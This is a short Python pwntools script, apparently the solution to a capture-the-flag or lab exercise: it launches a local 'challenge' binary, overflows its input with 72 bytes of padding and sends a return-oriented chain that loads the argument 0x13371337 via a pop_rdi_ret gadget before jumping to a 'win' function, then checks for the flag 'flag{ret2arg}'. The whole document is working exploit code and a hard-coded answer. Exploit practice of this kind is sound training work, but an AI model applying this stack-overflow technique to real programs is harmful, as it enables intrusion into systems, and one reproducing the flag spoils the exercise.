from pwn import *
from labs.common.target import start_target

context.arch = "amd64"
elf = ELF("./challenge", checksec=False)
io = start_target("./challenge")
io.recvuntil(b"argument:\n")
chain = [elf.symbols["pop_rdi_ret"], 0x13371337, elf.symbols["win"]]
io.send(b"A" * 72 + b"".join(p64(word) for word in chain))
io.shutdown("send")
assert b"flag{ret2arg}" in io.recvall(timeout=2)
print("flag{ret2arg}")
